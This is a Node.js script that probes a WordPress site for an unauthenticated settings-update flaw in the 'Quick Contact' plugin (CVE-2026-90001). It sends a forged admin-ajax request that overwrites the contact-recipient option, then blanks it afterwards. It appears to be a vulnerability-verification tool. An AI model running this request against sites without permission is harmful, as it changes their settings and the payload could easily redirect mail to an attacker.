#!/usr/bin/env node
// Exploit-verification probe for CVE-2026-90001
// "Quick Contact <= 1.0.0 - Missing Authorization to Unauthenticated Settings Update"
//
// The vulnerable action (qc_save_settings) is registered for both
// wp_ajax_qc_save_settings and wp_ajax_nopriv_qc_save_settings with no
// capability/nonce check, so any unauthenticated visitor can change the
// `qc_recipient` option via admin-ajax.php. This script sends such a
// request (with no auth cookies at all) and inspects the response to
// decide whether the target is still exploitable.
//
// Usage: node probe.mjs <base-url>
// Exit code 0 => vulnerable (unauthenticated write succeeded)
// Exit code 1 => not vulnerable (write was rejected / not exploitable)

const baseUrlArg = process.argv[2];
if (!baseUrlArg) {
	console.error('Usage: node probe.mjs <base-url>');
	process.exit(1);
}

let base;
try {
	base = new URL(baseUrlArg);
} catch (e) {
	console.error('Invalid base URL:', baseUrlArg);
	process.exit(1);
}

const ajaxUrl = new URL('/wp-admin/admin-ajax.php', base).toString();

// Marker value we use to attempt the unauthorized change. We never send any
// cookies/auth headers, simulating a fully unauthenticated attacker.
const PROBE_EMAIL = 'probe-' + Date.now() + '@example.invalid';

async function postAjax(params) {
	const body = new URLSearchParams(params);
	const res = await fetch(ajaxUrl, {
		method: 'POST',
		headers: {
			'Content-Type': 'application/x-www-form-urlencoded',
		},
		body: body.toString(),
		redirect: 'manual',
	});

	let text = '';
	try {
		text = await res.text();
	} catch (e) {
		text = '';
	}

	let json = null;
	try {
		json = JSON.parse(text);
	} catch (e) {
		json = null;
	}

	return { status: res.status, text, json };
}

function looksLikeSuccess(result) {
	// The vulnerable handler always calls update_option() unconditionally
	// and then wp_send_json_success(), so a successful unauthenticated
	// write manifests as HTTP 200 with {"success":true,...}.
	if (result.status !== 200) return false;
	if (!result.json) return false;
	return result.json.success === true;
}

async function main() {
	let vulnerable = false;

	try {
		// Attempt the unauthorized settings change as an unauthenticated user.
		const attempt = await postAjax({
			action: 'qc_save_settings',
			recipient: PROBE_EMAIL,
		});

		vulnerable = looksLikeSuccess(attempt);

		// Best-effort restoration: clear the recipient override we just set so
		// the option falls back to its previous behavior as closely as
		// possible. We cannot read the original value without authenticated
		// access, so clearing to an empty string is the most practical
		// restoration available from an unauthenticated vantage point.
		if (vulnerable) {
			try {
				await postAjax({ action: 'qc_save_settings', recipient: '' });
			} catch (e) {
				// Ignore restoration errors; exit status reflects exploit result.
			}
		}
	} catch (e) {
		console.error('Request to target failed:', e && e.message ? e.message : e);
		process.exit(1);
	}

	if (vulnerable) {
		console.log('VULNERABLE: unauthenticated request to qc_save_settings succeeded (missing authorization).');
		process.exit(0);
	} else {
		console.log('NOT VULNERABLE: unauthenticated request to qc_save_settings was rejected/did not succeed.');
		process.exit(1);
	}
}

main();
